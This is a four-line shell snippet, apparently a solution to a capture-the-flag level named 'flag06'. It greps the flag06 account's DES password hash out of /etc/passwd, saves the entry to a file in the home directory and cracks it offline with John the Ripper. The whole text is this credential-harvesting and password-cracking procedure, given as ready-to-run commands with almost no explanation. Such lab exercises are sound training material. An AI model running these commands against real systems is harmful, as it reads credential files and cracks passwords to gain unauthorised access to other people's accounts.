echo "DES Passwd: "`cat /etc/passwd | grep -i flag06| awk -F':' '{print $2}'`
echo `cat /etc/passwd | grep -i flag06` > ~/d
# Install john locally or extract this file ...
john ~/d